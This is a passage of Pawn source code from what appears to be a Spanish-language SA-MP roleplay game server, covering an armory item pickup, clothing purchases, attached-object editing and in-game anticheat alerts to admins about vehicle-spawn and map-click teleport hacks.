				if(PlayerInfo[playerid][pCint][x] == 0)
				{
				    PlayerInfo[playerid][pCint][x] = objeto;
				    PlayerInfo[playerid][pCintCant][x] = ObjetoInfo[objeto][Capacidad];
				    format(string, sizeof(string), "* %s coge un/a %s de la armería.", GetPlayerNameRP(playerid), ObjetoInfo[objeto][NombreObjeto]);
					ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
					return 1;
				}
			}
		}
	}
    return 1;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
return 1;
}

public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
    if(response)
    {
		new string[258];
		format(string, sizeof(string), "OBJETO: %d, %f,%f,%f,%f,%f,%f", PlayerInfo[playerid][pManoIzq], fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ);
		SendClientMessage(playerid, Blanco, string);
		printf(string);
    }
    return 1;
}

public OnPlayerModelSelection(playerid, response, listid, modelid)
{
	if(listid == ropa)
	{
	    if(!response){return 1;}
	    if(!IsValidSkin(modelid)){return 1;}
	    PlayerInfo[playerid][pSkin] = modelid;
	    SetPlayerSkin(playerid, modelid);
	    GivePlayerMoneyAC(playerid, -100);
	    SendClientMessage(playerid,Verde,"Compraste tu nueva ropa por 100$");
	    return 1;
	}
	return 1;
}

public OnIncomingConnection(playerid, ip_address[], port)
{
	return 1;
}

/*public OnStrangeEnterDetect(playerid, vehicleid) //Anti vehicle spawn
{
	new string[128];
	format(string, sizeof(string), "'%s' ha alterado el antihack de VEHICLE SPAWNER.", GetPlayerNameRP(playerid));
	SendAdminMessage(Aguamarina, string);
	format(string, sizeof(string), "* %s ha sido kickeado automáticamente por posible hack de vehículos.", GetPlayerNameRP(playerid));
	SendClientMessageToAll(Rojo, string);
	KickL(playerid);
	return 1;
}

public OnUnknownVehicleDetect(vehicleid, playerid)
{
    new string[128];
    format(string, sizeof(string), "'%s' ha alterado el anticheat de veículos.", GetPlayerNameRP(playerid));
	SendAdminMessage(Aguamarina, string);
	format(string, sizeof(string), "* %s ha sido kickeado automáticamente por posible hack de vehículos.", GetPlayerNameRP(playerid));
	SendClientMessageToAll(Rojo, string);
	KickL(playerid);
	return 1;
}

public OnVehicleTeleportDetect(forplayerid, vehicleid)
{
    new string[128];
    format(string, sizeof(string), "El vehículo %d ha alterado el antihack de VEHICLE WARP.", vehicleid);
	SendClientMessageToAll(Aguamarina, string);
	return 1;
}*/

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(PlayerInfo[playerid][pAdmin] == 0)
	{
		new string[256];
		format(string, sizeof(string), "[ANTICHEAT] Es posible que '%s' (%d) haya usado hack de teleport por click en el mapa. Vigiladlo.", GetPlayerNameRP(playerid), playerid);
		SendAdminMessage(Aguamarina, string);
	}
	return 1;
}
